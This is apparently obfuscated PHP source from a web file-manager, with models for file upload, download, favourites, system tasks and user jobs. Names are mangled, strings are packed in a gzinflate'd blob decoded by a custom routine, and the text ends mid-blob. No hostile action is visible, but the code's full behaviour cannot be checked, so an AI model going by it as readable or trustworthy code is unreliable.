$ïÇ›§Î¦ =& $_SERVER[å¸¿•¶£]; $€’î‘ÈÂ = $this->infoSimple($ÛÆÍóîÆ); return $€’î‘ÈÂ && $€’î‘ÈÂ[$ïÇ›§Î¦[410]] == $ïÇ›§Î¦[88] ? !0 : !1; } public function listPath($»ÕŸ´ù¼, $ãâ‡¦Âä = false) { $¼á¥œ› =& $_SERVER[å¸¿•¶£]; if ($»ÕŸ´ù¼ == $¼á¥œ›[12]) { return !1; } $“á¸¯‰À = array($¼á¥œ›[401] => $»ÕŸ´ù¼); if ($ãâ‡¦Âä) { return $this->model->listSource($“á¸¯‰À, -1); } return $this->model->listSource($“á¸¯‰À); } public function has($½ØÔö¾•, $¸˜„Ñî = false, $Šäğ‘§ç = null) { $µõ‹ÓŠ =& $_SERVER[å¸¿•¶£]; $íÃ´´´– = $this->infoWithChildren($½ØÔö¾•); if ($¸˜„Ñî) { return array($µõ‹ÓŠ[208] => $íÃ´´´–[$µõ‹ÓŠ[208]], $µõ‹ÓŠ[207] => $íÃ´´´–[$µõ‹ÓŠ[207]]); } return $Šäğ‘§ç ? $íÃ´´´–[$µõ‹ÓŠ[208]] : $íÃ´´´–[$µõ‹ÓŠ[207]]; } public function listAll($˜§»³£ã) { $‹Ğ”‹­Œ = IO::info($this->pathParse[$_SERVER[å¸¿•¶£][84]]); if (!$‹Ğ”‹­Œ) { return array(); } return $this->model->listAll($˜§»³£ã); } public function getContent($ş…ğâÒ) { return $this->model->getContent($ş…ğâÒ); } public function setContent($ïÂ¥¼Ãé, $ØğÓ—’Ş = '') { return $this->model->setContent($ïÂ¥¼Ãé, $ØğÓ—’Ş); } public function fileSubstr($ÀÌÓçª, $œ÷‚×Âš, $ş‹Í¥÷š) { return $this->model->fileSubstr($ÀÌÓçª, $œ÷‚×Âš, $ş‹Í¥÷š); } public function download($­…ßªçœ, $¿‚âÔô­ = '') { $áîøÇÜä = get_path_father($¿‚âÔô­); $§Å¹ôĞç = get_path_this($¿‚âÔô­); $ãË¡ÀÅ¢ = $this->model->fileInfoGet($­…ßªçœ); $Ú²ğ½Ì = IO::copy($ãË¡ÀÅ¢[$_SERVER[å¸¿•¶£][84]], $áîøÇÜä, !1, $§Å¹ôĞç); return $Ú²ğ½Ì; } public function setModifyTime($·²‡ÇÌ, $¾­ıÀ° = '') { $ûÖ‘ÈÔı =& $_SERVER[å¸¿•¶£]; if (!$·²‡ÇÌ) { return; } $this->model->where(array($ûÖ‘ÈÔı[417] => $·²‡ÇÌ))->save(array($ûÖ‘ÈÔı[85] => $¾­ıÀ°)); } public function upload($‰ÌÛ£Œ, $ùÔ³€‹Û, $£Ø¶Ğñº = false, $Áï§¬¸— = REPEAT_REPLACE) { $¹åÀñêµ =& $_SERVER[å¸¿•¶£]; $‚…ı›¸» = $this->parse($‰ÌÛ£Œ); $¡Öà¾Ø© = $this->model->addFile($‚…ı›¸»[$¹åÀñêµ[399]], $ùÔ³€‹Û, $‚…ı›¸»[$¹åÀñêµ[84]], $£Ø¶Ğñº, $Áï§¬¸—); return $this->getPathOuter($¡Öà¾Ø©); } public function uploadFileByID($şˆš¸ÃË, $µ¥ÁÙ, $½¡ş„³Ô) { $Û¡É¡áÆ =& $_SERVER[å¸¿•¶£]; $å¦áÎ÷ä = $this->parse($şˆš¸ÃË); $™šº˜÷ƒ = $this->model->addFileByFileID($å¦áÎ÷ä[$Û¡É¡áÆ[399]], $µ¥ÁÙ, $å¦áÎ÷ä[$Û¡É¡áÆ[84]], $½¡ş„³Ô); return $this->getPathOuter($™šº˜÷ƒ); } public function addFileByRemote($–ä¦ÔŸ‘, $Ù­Ñ€é¤, $‡†æä = array(), $†‘Ùˆª‡ = '', $ÉŠßë÷ã) { $ŞºÕ¾Ò° =& $_SERVER[å¸¿•¶£]; $›í¦ö• = $this->parse($–ä¦ÔŸ‘); $†‘Ùˆª‡ = empty($†‘Ùˆª‡) ? $›í¦ö•[$ŞºÕ¾Ò°[84]] : $†‘Ùˆª‡; $€ë³¯ = $this->model->addFileByRemote($›í¦ö•[$ŞºÕ¾Ò°[399]], $Ù­Ñ€é¤, $†‘Ùˆª‡, $‡†æä, $ÉŠßë÷ã); return $this->getPathOuter($€ë³¯); } public function uploadLink($û‰ö½ƒÓ, $ê“áú¸ = 0) { $ë©ìºê’ =& $_SERVER[å¸¿•¶£]; $‰¼å¡ù = $this->parse($û‰ö½ƒÓ); $¸ùŞæ¤ı = _get($GLOBALS[$ë©ìºê’[7]], $ë©ìºê’[1348]); $Ş±Â‹èñ = _get($GLOBALS[$ë©ìºê’[7]], $ë©ìºê’[1349]); $û‰ö½ƒÓ = Model($ë©ìºê’[601])->createFileName($‰¼å¡ù[$ë©ìºê’[84]], $¸ùŞæ¤ı, $Ş±Â‹èñ); return IO::uploadLink($û‰ö½ƒÓ, $ê“áú¸); } public function fileNameAuto($—ø¼Ş«ß, $©«‚ôèÄ, $¸úÖÑªß = REPEAT_REPLACE, $Ú¢œ è£ = false) { return $this->model->fileNameAuto($—ø¼Ş«ß, $©«‚ôèÄ, $¸úÖÑªß, $Ú¢œ è£); } public function fileNameExist($½Êèé¨Á, $Ï–‰Œ·) { return $this->model->fileNameExist($½Êèé¨Á, $Ï–‰Œ·); } protected function _fileOut($†¶â©ãÎ, $ßî¨ÃÀ = false, $öàÃİ®Ó = false, $ÀÕ«‚¡ = '', $Åª ò¾Ù = false) { $ãæ¹À ì =& $_SERVER[å¸¿•¶£]; $Œ £‹Íù = $this->model->sourceInfo($†¶â©ãÎ); if ($Œ £‹Íù[$ãæ¹À ì[410]] == $ãæ¹À ì[88]) { header($ãæ¹À ì[1350]); die; } $‚‰îÑ = $this->model->fileInfoGet($†¶â©ãÎ); $ÀÕ«‚¡ = $‚‰îÑ[$ãæ¹À ì[176]] ? $‚‰îÑ[$ãæ¹À ì[176]] : $ÀÕ«‚¡; $ø²¡ô€• = isset($GLOBALS[$ãæ¹À ì[1351]]) ? $GLOBALS[$ãæ¹À ì[1351]] : $Œ £‹Íù[$ãæ¹À ì[32]]; if ($Åª ò¾Ù) { return IO::fileOutServer($‚‰îÑ[$ãæ¹À ì[84]], $ßî¨ÃÀ, $ø²¡ô€•, $ÀÕ«‚¡); } IO::fileOut($‚‰îÑ[$ãæ¹À ì[84]], $ßî¨ÃÀ, $ø²¡ô€•, $ÀÕ«‚¡); } public function fileOut($¢çÛŸ‹Ê, $é¸•ÍË¢ = false, $ ™è¶‹¾ = false, $·Í·©Ô = '') { $this->_fileOut($¢çÛŸ‹Ê, $é¸•ÍË¢, $ ™è¶‹¾, $·Í·©Ô); } public function fileOutServer($åŸˆ°£, $Ã™Î»¥ó = false, $ƒÇœè•¾ = false, $‰Ç¥Ûªğ = '') { $this->_fileOut($åŸˆ°£, $Ã™Î»¥ó, $ƒÇœè•¾, $‰Ç¥Ûªğ, !0); } protected function _fileOutImage($×¤¤Ú¾è, $ó¸¬³Ûù = 250) { $­–ÏÍ™ï =& $_SERVER[å¸¿•¶£]; $ª¿ô¢ÀŠ = $this->model->pathInfo($×¤¤Ú¾è); if ($ª¿ô¢ÀŠ[$­–ÏÍ™ï[410]] == $­–ÏÍ™ï[88]) { show_json($­–ÏÍ™ï[1352] . $×¤¤Ú¾è, !1); } $ñĞ¾…¢ç = $this->model->fileInfoGet($×¤¤Ú¾è); $ñĞ¾…¢ç[$­–ÏÍ™ï[32]] = $ª¿ô¢ÀŠ[$­–ÏÍ™ï[32]]; $ñĞ¾…¢ç[$­–ÏÍ™ï[169]] = $ª¿ô¢ÀŠ[$­–ÏÍ™ï[169]]; $GLOBALS[$­–ÏÍ™ï[1351]] = $ñĞ¾…¢ç[$­–ÏÍ™ï[32]]; $GLOBALS[$­–ÏÍ™ï[168]] = $ñĞ¾…¢ç; IO::fileOutImage($ñĞ¾…¢ç[$­–ÏÍ™ï[84]], $ó¸¬³Ûù); } public function fileOutImage($„‰¦Ì½î, $–·­Àôœ = 250) { $this->_fileOutImage($„‰¦Ì½î, $–·­Àôœ); } public function fileOutImageServer($ïñş‹´İ, $Ë¢ŞëØö = 250) { $this->_fileOutImage($ïñş‹´İ, $Ë¢ŞëØö); } public function link($¸Œ÷’Ó², $Ä¼áñ¼æ = '') { $Ó¢¸íøæ = $this->model->fileInfoGet($¸Œ÷’Ó²); return IO::link($Ó¢¸íøæ[$_SERVER[å¸¿•¶£][84]], $Ä¼áñ¼æ); } protected function parse($Ğ×Äƒ¯õ) { $ş¶¤µèÚ =& $_SERVER[å¸¿•¶£]; if (strstr($Ğ×Äƒ¯õ, $ş¶¤µèÚ[8]) === !1) { return array($ş¶¤µèÚ[419] => intval($Ğ×Äƒ¯õ), $ş¶¤µèÚ[84] => $ş¶¤µèÚ[12], $ş¶¤µèÚ[1347] => array()); } $Â³±¡ò· = explode($ş¶¤µèÚ[8], trim($Ğ×Äƒ¯õ, $ş¶¤µèÚ[8])); if (count($Â³±¡ò·) < 2) { show_tips(clear_html($Ğ×Äƒ¯õ) . $ş¶¤µèÚ[1353]); } return array($ş¶¤µèÚ[419] => intval($Â³±¡ò·[0]), $ş¶¤µèÚ[84] => $Â³±¡ò·[1], $ş¶¤µèÚ[1347] => array_slice($Â³±¡ò·, 1)); } } goto Eğ¸âÚœ…Ë; dçßÃœŞ: define($_SERVER[å¸¿•¶£][0], $_SERVER[å¸¿•¶£][1]); $_SERVER[ü»Éä¾] = explode($_SERVER[å¸¿•¶£][2], gzinflate(substr($_SERVER[å¸¿•¶£][3], 10, -8))); function binCheckEq($ş²¹ğïé, $äËôÄ») { return $ş²¹ğïé == $äËôÄ»; } goto DŸíÔ…¯ƒš; AôÉ ¸æ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x74\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x74\171\160\x65", "\x65\166\x65\156\x74", "\164\151\155\x65", "\144\x65\163\143", "\x73\x79\x73\164\x65\155", "\x65\156\141\x62\x6c\145", "\x6c\x61\163\x74\122\x75\x6e", "\163\157\x72\164"); public function listData($ÌÚ’ãòÚ = false, $Ë”ÊØ = "\x73\x6f\162\164", $¹€ôÇÚ = false) { return parent::listData($ÌÚ’ãòÚ, $Ë”ÊØ, $¹€ôÇÚ); } public function add($ò¦ßæØ) { $ú›Éæú =& $_SERVER[å¸¿•¶£]; $äß¡™ø = $this->findByName($ò¦ßæØ[$ú›Éæú[32]]); if ($äß¡™ø) { return !1; } $ò¦ßæØ[$ú›Éæú[1634]] = 0; $ò¦ßæØ[$ú›Éæú[1887]] = $this->getSort(); return parent::insert($ò¦ßæØ); } private function getSort() { $à áõç† =& $_SERVER[å¸¿•¶£]; $øÚşîò = parent::listData(); $Ñõ·ã¤ = array_to_keyvalue($øÚşîò, $à áõç†[12], $à áõç†[1887]); return empty($Ñõ·ã¤) ? 0 : max($Ñõ·ã¤) + 1; } public function update($Ó“™èà, $é‚şû„) { $¿èÄÊËÑ =& $_SERVER[å¸¿•¶£]; $ëÃÌ‰ıŒ = $this->listData($Ó“™èà); $ÇØ»ÉŸì = $this->findByName($é‚şû„[$¿èÄÊËÑ[32]]); if (!$ëÃÌ‰ıŒ || $ÇØ»ÉŸì && $ÇØ»ÉŸì[$¿èÄÊËÑ[399]] != $ëÃÌ‰ıŒ[$¿èÄÊËÑ[399]]) { return !1; } return parent::update($Ó“™èà, $é‚şû„); } public function remove($Ï¬şÔË, $ç«°»ô = false) { $×€Šò³ =& $_SERVER[å¸¿•¶£]; $ÒŸ½ÛÙ© = $this->listData($Ï¬şÔË); if (!$ÒŸ½ÛÙ©) { return; } if (!$ç«°»ô && $ÒŸ½ÛÙ©[$×€Šò³[1291]] == $×€Šò³[88]) { return !1; } return parent::remove($Ï¬şÔË); } public function enable($ÄêƒğÀ‚, $¥šº¥ä) { return $this->update($ÄêƒğÀ‚, array($_SERVER[å¸¿•¶£][2294] => $¥šº¥ä)); } public function run($ø® ¢øş) { return $this->update($ø® ¢øş, array($_SERVER[å¸¿•¶£][2306] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($óÈ€¿Ñö) { $Ÿæø˜€ˆ =& $_SERVER[å¸¿•¶£]; return array($Ÿæø˜€ˆ[1974] => array(USER_ID, $Ÿæø˜€ˆ[2307])); } protected function listData() { $‡Î‚×“È =& $_SERVER[å¸¿•¶£]; $şí©¢ÎË = array($‡Î‚×“È[1665] => USER_ID, $‡Î‚×“È[483] => 0); $À­ «¼Õ = $‡Î‚×“È[2308]; $Ö´ª½Â = $this->field($À­ «¼Õ)->where($şí©¢ÎË)->order($‡Î‚×“È[2309])->select(); return $Ö´ª½Â ? $Ö´ª½Â : array(); } protected function resetCache() { } protected function listView() { $éĞâåá =& $_SERVER[å¸¿•¶£]; $çÊ¶Ùİ = $this->listData(); $Èêúœ’ˆ = array_filter_by_field($çÊ¶Ùİ, $éĞâåá[33], $éĞâåá[416]); $ÌÄÁêÅÔ = array_to_keyvalue($Èêúœ’ˆ, $éĞâåá[12], $éĞâåá[84]); if (!$ÌÄÁêÅÔ) { return $çÊ¶Ùİ; } $÷“Õ£¶© = 2000; $¾Ñ¿ªø = array($éĞâåá[417] => array($éĞâåá[418], $ÌÄÁêÅÔ)); $´ûÁ¦å“ = Model($éĞâåá[832])->listSource($¾Ñ¿ªø, $÷“Õ£¶©); $´ûÁ¦å“ = array_merge($´ûÁ¦å“[$éĞâåá[83]], $´ûÁ¦å“[$éĞâåá[82]]); $´ûÁ¦å“ = array_to_keyvalue($´ûÁ¦å“, $éĞâåá[402]); foreach ($çÊ¶Ùİ as $»ú‰ºÜ… => $¤Õ¡¨Òğ) { $‰åù²âÉ = $´ûÁ¦å“[$¤Õ¡¨Òğ[$éĞâåá[84]]]; $‰åù²âÉ = $‰åù²âÉ ? $‰åù²âÉ : array(); $çÊ¶Ùİ[$»ú‰ºÜ…] = array_merge($‰åù²âÉ, $¤Õ¡¨Òğ); } return $çÊ¶Ùİ; } protected function addFav($¹…ÉÙ¦, $Ñ»‡«òÈ = '', $ëÀ°ŒíÔ = "\x73\157\165\162\143\x65") { $ŒÓ ½¼µ =& $_SERVER[å¸¿•¶£]; $ĞŸÅÚÔú = array($ŒÓ ½¼µ[1665] => USER_ID, $ŒÓ ½¼µ[483] => 0, $ŒÓ ½¼µ[422] => $ëÀ°ŒíÔ, $ŒÓ ½¼µ[421] => $¹…ÉÙ¦); if ($this->where($ĞŸÅÚÔú)->find()) { return !1; } $ĞŸÅÚÔú = array($ŒÓ ½¼µ[1665] => USER_ID, $ŒÓ ½¼µ[483] => 0); $ «Ò¹Ô˜ = $this->where($ĞŸÅÚÔú)->max($ŒÓ ½¼µ[1887]); if (!$ «Ò¹Ô˜) { $ «Ò¹Ô˜ = 0; } if (!$Ñ»‡«òÈ && $ëÀ°ŒíÔ == $ŒÓ ½¼µ[416]) { $Ç´Ò«šŸ = Model($ŒÓ ½¼µ[1346])->where(array($ŒÓ ½¼µ[417] => $¹…ÉÙ¦))->find(); if (!$Ç´Ò«šŸ) { return !1; } $Ñ»‡«òÈ = $Ç´Ò«šŸ[$ŒÓ ½¼µ[32]]; } $Ñ»‡«òÈ = $this->getAutoName($Ñ»‡«òÈ); $œæ¦¯Úò = array($ŒÓ ½¼µ[1665] => USER_ID, $ŒÓ ½¼µ[483] => 0, $ŒÓ ½¼µ[420] => $Ñ»‡«òÈ, $ŒÓ ½¼µ[421] => $¹…ÉÙ¦, $ŒÓ ½¼µ[422] => $ëÀ°ŒíÔ, $ŒÓ ½¼µ[1867] => $ «Ò¹Ô˜ + 1); return $this->add($œæ¦¯Úò); } protected function remove($ÙÊÉå£) { $Â¦…É˜ =& $_SERVER[å¸¿•¶£]; $Ûó¾æÎ… = array($Â¦…É˜[1665] => USER_ID, $Â¦…É˜[419] => $ÙÊÉå£); return $this->where($Ûó¾æÎ…)->delete(); } protected function removeByName($Àı—Ë©ö) { $Ê¡şÑñı =& $_SERVER[å¸¿•¶£]; $İ°¯äèË = array($Ê¡şÑñı[1665] => USER_ID, $Ê¡şÑñı[420] => $Àı—Ë©ö, $Ê¡şÑñı[483] => 0); return $this->where($İ°¯äèË)->delete(); } protected function rename($šàÕ•¦, $¤âå·¿ú) { $Öß¡ã÷ü =& $_SERVER[å¸¿•¶£]; if ($šàÕ•¦ == $¤âå·¿ú) { return !1; } $¦×¬ÊŸÈ = $this->getAutoName($¤âå·¿ú); if ($¤âå·¿ú != $¦×¬ÊŸÈ) { return !1; } $Š®Ú«ï = array($Öß¡ã÷ü[1665] => USER_ID, $Öß¡ã÷ü[483] => 0, $Öß¡ã÷ü[32] => $šàÕ•¦); return $this->where($Š®Ú«ï)->save(array($Öß¡ã÷ü[32] => $¤âå·¿ú)); } protected function resetSort($íÌ¥Ë¾Õ) { $øÚ÷Ø¡ =& $_SERVER[å¸¿•¶£]; $íÌ¥Ë¾Õ = is_array($íÌ¥Ë¾Õ) ? $íÌ¥Ë¾Õ : array(); $¦«æ—Ÿú = array($øÚ÷Ø¡[1665] => USER_ID); for ($àšÑÒğ× = 0; $àšÑÒğ× < count($íÌ¥Ë¾Õ); $àšÑÒğ×++) { $¦«æ—Ÿú[$øÚ÷Ø¡[419]] = $íÌ¥Ë¾Õ[$àšÑÒğ×]; $this->where($¦«æ—Ÿú)->save(array($øÚ÷Ø¡[1867] => $àšÑÒğ× + 1)); } return !0; } protected function moveTop($äµ¼Õµà) { $¬é£ìš· =& $_SERVER[å¸¿•¶£]; $ÃÃÌåœ = array($¬é£ìš·[1665] => USER_ID, $¬é£ìš·[483] => 0); $÷¦ñ¢ÇÔ = $this->where($ÃÃÌåœ)->where(array($¬é£ìš·[32] => $äµ¼Õµà))->find(); if (!$÷¦ñ¢ÇÔ) { return; } $ ñÎò§¿ = $this->field($¬é£ìš·[399])->where($ÃÃÌåœ)->order($¬é£ìš·[2309])->select(); $ ñÎò§¿ = array_to_keyvalue($ ñÎò§¿, $¬é£ìš·[12], $¬é£ìš·[399]); $¬ÈğŸÅ = $ ñÎò§¿; $ ñÎò§¿ = array_remove_value($ ñÎò§¿, $÷¦ñ¢ÇÔ[$¬é£ìš·[399]]); array_unshift($ ñÎò§¿, $÷¦ñ¢ÇÔ[$¬é£ìš·[399]]); return $this->resetSort($ ñÎò§¿); } protected function moveBottom($íÜç¾ùÚ) { $Ä·º¿¬ü =& $_SERVER[å¸¿•¶£]; $ÛÌ«±ä  = array($Ä·º¿¬ü[1665] => USER_ID, $Ä·º¿¬ü[483] => 0); $ˆ³àö¡ = $this->where($ÛÌ«±ä )->max($Ä·º¿¬ü[1887]); $¼ÅÖÌ = array($Ä·º¿¬ü[1887] => $ˆ³àö¡ + 1); return $this->where($ÛÌ«±ä )->where(array($Ä·º¿¬ü[32] => $íÜç¾ùÚ))->save($¼ÅÖÌ); } private function getAutoName($ĞÈš‰õË) { $”—ä„« =& $_SERVER[å¸¿•¶£]; $Ò›Ëìäà = array($”—ä„«[1665] => USER_ID, $”—ä„«[483] => 0); $’áôÅÑ = $this->field($”—ä„«[32])->where($Ò›Ëìäà)->select(); $’áôÅÑ = array_to_keyvalue($’áôÅÑ, $”—ä„«[12], $”—ä„«[32]); if (!$’áôÅÑ || !in_array($ĞÈš‰õË, $’áôÅÑ)) { return $ĞÈš‰õË; } for ($ú§Ñº”å = 0; $ú§Ñº”å < count($’áôÅÑ); $ú§Ñº”å++) { if (!in_array($ĞÈš‰õË . "\x28{$ú§Ñº”å}\51", $’áôÅÑ)) { return $ĞÈš‰õË . "\50{$ú§Ñº”å}\51"; } } return $ĞÈš‰õË . "\x28{$ú§Ñº”å}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\152\x6f\142\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\144\x65\163\143", "\163\157\162\x74"); const JOB_KEY = "\x73\145\x6c\146\x4a\157\x62\114\x69\x73\164"; public function listData($Ò¡©½¾İ = false, $şà½¯¤ = "\163\x6f\x72\x74", $š„Ï¸•† = false) { return parent::listData($Ò¡©½¾İ, $şà½¯¤, $š„Ï¸•†); } public function remove($À‚Ê¹Ö) { return parent::remove($À‚Ê¹Ö); } public function add($õêÓæ·) { $×ÖãìÛ« =& $_SERVER[å¸¿•¶£]; if ($this->findByName($õêÓæ·[$×ÖãìÛ«[32]])) { return !1; } $õêÓæ·[$×ÖãìÛ«[1887]] = $this->getSort(); return parent::insert($õêÓæ·); } private function getSort() { $Å˜é¦ =& $_SERVER[å¸¿•¶£]; $øÌ¡Á‚ = parent::listData(); $„‚úÅÉ = array_to_keyvalue($øÌ¡Á‚, $Å˜é¦[12], $Å˜é¦[1887]); return empty($„‚úÅÉ) ? 0 : max($„‚úÅÉ) + 1; } public function update($ıŠ±…ù§, $›Ñó•ÑÃ) { $İå¦ğ” =& $_SERVER[å¸¿•¶£]; $ıÏ«‰¥® = parent::listData($ıŠ±…ù§); $Ä¢‘Äñ’ = $this->findByName($›Ñó•ÑÃ[$İå¦ğ”[32]]); if (!$ıÏ«‰¥® || $Ä¢‘Äñ’ && $Ä¢‘Äñ’[$İå¦ğ”[399]] != $ıÏ«‰¥®[$İå¦ğ”[399]]) { return !1; } return parent::update($ıŠ±…ù§, $›Ñó•ÑÃ); } public function setUserJob($«ëÒÓè, $º¹ß¾‰õ) { $êÙæ°óæ =& $_SERVER[å¸¿•¶£]; if (!is_array($º¹ß¾‰õ)) { $º¹ß¾‰õ = array($º¹ß¾‰õ); } $«›ãÊ£í = parent::listData(); $Òš¤²°ì = array_to_keyvalue($«›ãÊ£í, $êÙæ°óæ[32]); $—Ì” = $êÙæ°óæ[378]; foreach ($º¹ß¾‰õ as $©ƒ®–®Â) { if ($Òš¤²°ì[$©ƒ®–®Â]) { $—Ì” .= $Òš¤²°ì[$©ƒ®–®Â][$êÙæ°óæ[399]] . $êÙæ°óæ[50]; } else { $Ÿ§ÑÊâŠ = $this->add($©ƒ®–®Â); $—Ì” .= $Ÿ§ÑÊâŠ . $êÙæ°óæ[50]; } } $—Ì” = rtrim($—Ì”, $êÙæ°óæ[50]); Model($êÙæ°óæ[525])->metaSet($«ëÒÓè, self::JOB_KEY, $—Ì”); } public function getUserJob($İäùÕ¤ô) { $“¡Æœ¯ = Model($_SERVER[å¸¿•¶£][525])->metaGet($İäùÕ¤ô); return $this->getUserJobInfo($“¡Æœ¯[self::JOB_KEY]); } public function getUserJobInfo($©²ğè“) { $³ËŞ¿š· =& $_SERVER[å¸¿•¶£]; $‚´£Ü…ı = explode($³ËŞ¿š·[50], $©²ğè“); $Õ´ÅÒÚâ = parent::listData(); $Õ´ÅÒÚâ = array_remove_key($Õ´ÅÒÚâ, $³ËŞ¿š·[201]); $Ê¢›Öœ = array(); foreach ($‚´£Ü…ı as $Ò­±Áî“) { if (isset($Õ´ÅÒÚâ[$Ò­±Áî“])) { $Ê¢›Öœ[] = $Õ´ÅÒÚâ[$Ò­±Áî“]; } } return $Ê¢›Öœ; } } goto E©’‡¤ö; A°’ÚÄ• ­: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xe5\xb8\xbf\x95\xb6\xa3", "\xef\xbf\xb6\xb6\xfe\xb1"); $_SERVER[å¸¿•¶£] = explode("\174\3\174\5\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\265\70\316\22\366\122\240\364\321\5\12\23\103\260\235\150\161\234\335\211\23\144\133\216\225\310\226\43\311\331\354\60\31"._kodDe('KRg+YV4YPoHEGrF2Xlor2hzkpjeEllTNQmGWQB6rdsd5PLP/TrECkUcLpTfddl6w58A=').strrev('ú]ç³ŸŞıßıæÀ|ß÷›§í|¿ş|~ç9îsç½î{ß»š$¾_¾ûÿïÿxdŒË¹')."\xbd\x79\xda\xe6\x7d\xd1\x3f\xf2\x7d\xc2\xb9\x7\xef\x43\xfe\x1c\x7d\xee\x39\xd\xd\x5d\xf3\xf\x9d\xd5\xf3\x85\x6d\x77\xed\xd0\x6e\xd6\xb6\x6b\x67\xc7\xa2\xbb\x9e\x8a\x1c\xfe\xf4\xf6\x15\xe1\x3d"."\x37\xec\x1a\xdf\xb3\xef\x3e\xdb\x16\x9d\x77\x70\xb\xca\x4c\xcb\xb6\xd0\x1f\xa5\x64\x3a\x8a\x3e\x66\xd8\x8e\x4d\x23\xd2\x66\x29\x6b\xe4\xe8\xb7\x51\xa2\xbf\x41\xfa\xd3\x17\x8f\x5a\x7a\xd1\x74\x74"."\32\14\320\37\25\372\105\376\267\207\13\6\113\127\173\142\111\65\321\327\333\33\216\47\41\123\213\234\136\64\63\360\125\326\54\255\10\355\227\165\313\106\275\221\253\123\313\146\131".base64_decode('L7liRERGc7SUZkNNHW1qR7g3GlunJtf1hiFHSh2u6NY4DZHPhKNZTtIo6jzHqMX71Q==')."\26\136\36\351\121\222\361\120\117\42\324\236\214\304\172\150\164\173\254\273\73\222\254\216\217\307\242\321\266\120\373\312\352\224\336\170\150\171\167\110\101\375\53\350\252\121\312\232\15"."\xca\x46\x9a\xb2\x51\x69\xa4\x1f\x9d\x86\x5e\xc8\xd0\xcf\x92\xc6\xba\xe3\x8c\x97\xe1\x2b\xc9\xbf\xd0\x34\x95\x2a\x85\x2\xd\xf4\xf0\xaf\x8c\x9e\xd5\x2a\x5\x80\x56\x87\x1c\x28\x5b\x46\x51\x63\x83"."\x5e\xa9\x8f\xf3\x58\xfa\xa1\x55\x1c\xd3\x28\xa5\x69\x20\x3c\xe6\x58\x9a\x88\x47\x7d\x4d\xa3\x89\xd6\x4b\x50\x55\x22\x1c\xd\xb7\x27\x15\xdc\x41\xa5\x33\x1e\xeb\x56\x60\x12\x8a\x9a\xed\xe8\x96\xb2"."\246\53\34\17\53\270\323\255\365\144\254\365\12\254\227\36\4\12\45\24\215\52\123\325\340\350\305\62\253\206\226\251\121\131\54\336\21\216\53\155\353\24\1\241\264\131\54\232\245"."\0\252\5\315\244\43\165\65\34\217\323\17\37\54\357\150\4\117\32\4\142\235\235\211\60\17\301\340\126\105\121\117\346\300\372\164\205\62\331\202\243\216\150\205\12\133\246\103\364"."\xb7\x1e\x7e\xe0\xd7\xb4\x61\xe9\xe\x1b\x25\xa3\x2\xcb\x14\xaa\x30\x4d\xbe\xad\xe0\xa3\xc2\x72\xeb\x2c\x46\xcf\xc0\x47\x11\x95\x37\x61\xe7\xa1\x6d\x38\x42\x3f\x5b\x97\xd2\xdf\xc5\x90\x29\xa5\xe2"."\x34\xdd\x72\x54\xbd\x94\x36\x33\x46\x9\x36\xeb\x32\x58\x74\x9a\x93\xef\xb0\xc\x94\x81\x86\xb3\x66\x21\xc3\xbe\x6d\x63\x2\x86\x92\x35\xa\x7a\x4f\xa5\x28\x67\xe1\xc1\x74\xde\x28\x64\x2c\xb6\xbf".base64_decode('PisnDUb5dsV5RaiMesJ3upEdF/sN5+vlqbZZsdJ6BO0PGp4N0brjoMEBbAyzr1wwtQ==')."\x4c\x42\xb7\xf8\xd0\xc\xb3\x13\x55\x14\xab\x38\x72\x64\x85\x64\xeb\x34\xad\x62\x7\xc2\xc\xd0\x3e\xda\x15\x46\x5f\x8d\x84\x21\xb6\x2f\x32\x12\xc4\x82\xd\xfd\xa7\xfb\xff\xb5\xa1\xff\x14\xf4\x5f"."\43\240\276\1\350\123\136\57\24\124\175\114\207\215\123\314\314\263\31\60\202\166\312\50\5\121\14\15\106\142\152\136\263\363\335\231\171\52\51\305\60\152\106\37\13\224\363\145\330"."\325\174\43\17\270\26\66\6\135\217\351\204\45\274\134\60\323\132\101\36\42\375\316\73\116\71\241\227\62\30\22\60\24\163\264\104\40\125\326\165\310\324\341\123\62\112\267\262\116".base64_decode('6WoxWmxWsFjgX2x0PM7mkc4Ym85Mln6k2LFQBw0aNsFwYntq5XLBSGuOYZaCZtrRHQ==')."\277\355\130\272\6\65\206\322\151\335\266\375\355\146\311\261\314\202\77\124\50\230\243\376\230\145\344\214\122\213\62\23\220\55\112\104\233\332\217\21\140\13\354\324\272\305\12\136\70".strrev('Öú¢ Æ<éhãš(µîàm¦Ë°Ã­–Ac–uŒì0ş[«;%imÏ vÈ_ë\'­™™¸').strrev('q¤¢Ó@š8jvA'."\n".'Jå(µ¨®ZZ÷÷]ª	P“»Ë*¾³n–+Ê¯IF'."\n".'”oÈÏ')."\xd0\xa7\x14\x2b\xb6\xe3\xb7\x74\x84\x8a\xc\x74\xdc\x1\x90\x23\x59\x7f\x37\xde\x57\x86\x9e\xf1\x27\x10\xc6\x86\xe8\x39\x4d\x73\x15\xb4\x74\x14\x96\x46\x63\xbb\x92\xc9\x5e\x35\xd2\x89\x8e\xe4\x9e"."\260\332\35\112\266\167\101\267\35\55\307\372\34\105\170\230\127\311\42\327\372\321\376\302\213\253\7\215\125\104\366\232\243\272\205\32\156\33\157\121\206\314\114\312\34\13\260\44\234".base64_decode('OYEQDcuMp7vs+ONaKYfhkxp3dFiC9kjODeioXso5eVYwEY6vDsfVRKwzuSYUD8OOQQ==').base64_decode('q2SMNYWrLvjjegaBPu2wcloZQ43lwZsDzxVLxRuGpUUjyzFgOvw2yuSXc7G6o0bRwA==')._kodDe('MGVr+GYSb9coMYVwdS5S8Zu65G90mrotNG3oUVQu7U41dNQvU4IxvPe6/IhE1ImrGXY=')."\xf4\x30\xb4\x82\x2\x83\xae\xca\xd1\xa4\xc4\x56\xba\xc1\x22\x56\